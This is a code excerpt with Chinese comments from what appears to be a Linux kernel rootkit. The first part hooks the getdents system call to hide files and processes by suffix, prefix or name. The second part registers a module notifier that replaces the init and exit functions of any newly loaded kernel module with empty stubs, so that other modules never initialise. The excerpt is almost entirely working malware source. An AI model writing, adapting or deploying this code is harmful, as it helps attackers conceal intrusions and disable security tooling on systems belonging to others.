1.隐藏特定后缀名文件
int check_file_suffix(const char *name) //检查后缀名函数
{
    int len = strlen(name);
    int suffix_len = strlen(FILE_SUFFIX);
    if (len >= suffix_len)
    {
        const char *check_suffix = name;
        check_suffix += len - suffix_len;
        if (strcmp(check_suffix, FILE_SUFFIX) == 0)
            return 1;
    }
    return 0;
}

int should_be_hidden(const char *name) //判断后缀名是否被隐藏
{
    return check_file_suffix(name) | check_process_prefix(name) | //调用check_file_suffix()函数判断后缀名是否需要隐藏
           check_file_name(name);
}


asmlinkage long new_sys_getdents(unsigned int fd,
                                 struct linux_dirent __user *dirent, unsigned int count)/*fd为指向目录文件的文件描述符，该函数根据fd所指向的目录文件读取相应dirent结构，
                                并放入dirp中，其中count为dirp中返回的数据量，正确时该函数返回值为填充到dirp的字节数*/
{
    int ret = ref_sys_getdents(fd, dirent, count);//劫持sys_getdents的返回值
    unsigned short p = 0;
    unsigned long off = 0;
    struct linux_dirent *dir, *kdir, *prev = NULL;
    struct inode *d_inode;

    if (ret <= 0)
        return ret;

    kdir = kzalloc(ret, GFP_KERNEL);    //为返回值ret开辟内存空间
    if (kdir == NULL)
        return ret;

    if (copy_from_user(kdir, dirent, ret))
        goto end;

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
    d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
#else
    d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
#endif

    if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev))
        p = 1;

    while (off < ret)
    {
        dir = (void *)kdir + off; //遍历返回值ret中的文件
        if (should_be_hidden((char *)dir->d_name))//判断是否隐藏
        {
            //printk(KERN_INFO "hiden %s\n", dir->d_name);
            if (dir == kdir)
            {
                ret -= dir->d_reclen;
                memmove(dir, (void *)dir + dir->d_reclen, ret);//隐藏文件
                continue;
            }             //删除掉需要隐藏的文件名
            prev->d_reclen += dir->d_reclen;
        }
        else
        {
            prev = dir;
        }
        off += dir->d_reclen;
    }
    if (copy_to_user(dirent, kdir, ret))
        goto end;

end:
    kfree(kdir);
    return ret;
}

2.控制/阻止新模块的加载
int fake_init(void) //我们自己写的init函数
{
    if (DEBUG)
        printk(KERN_INFO "%s\n", "Fake init."); //如果检测到新模块加载，输出Fake init.

    return 0;
}

void fake_exit(void) //我们自己写的exit函数
{
    if (DEBUG)
        printk(KERN_INFO "%s\n", "Fake exit.");//如果检测到新模块卸载，输出Fake exit.

    return;
}
int module_notifier(struct notifier_block *nb,
                    unsigned long action, void *data)
{
    struct module *module;
    unsigned long flags;
    DEFINE_SPINLOCK(module_notifier_spinlock);

    module = data;
    if (DEBUG)
        printk(KERN_INFO "Processing the module: %s\n", module->name);

    spin_lock_irqsave(&module_notifier_spinlock, flags);
    switch (module->state)
    {
    case MODULE_STATE_COMING:   /*已经注册完模块通知函数，在模块完成加载之后、开始初始化之前(即模块状态为MODULE_STATE_COMING)，
                                将其初始函数掉包成一个什么也不做的函数，就会导致模块不能完成初始化。*/

        if (DEBUG)
            printk(KERN_INFO "Replacing init and exit functions: %s.\n",
                   module->name);
        module->init = fake_init;  //将新加载模块的初始化函数换成我们写的初始化函数，导致新模块不能加载
        module->exit = fake_exit;
        break;
    default:
        break;
    }
    spin_unlock_irqrestore(&module_notifier_spinlock, flags);

    return NOTIFY_DONE;
}

void regist_komon(void)    //注册一个模块通知处理函数
{
    if (is_komon != 0)
        return;
    is_komon = 1;
    register_module_notifier(&nb);
}

void unregist_komon(void)   //解除注册
{
    if (is_komon == 0)
        return;
    is_komon = 0;
    unregister_module_notifier(&nb);
}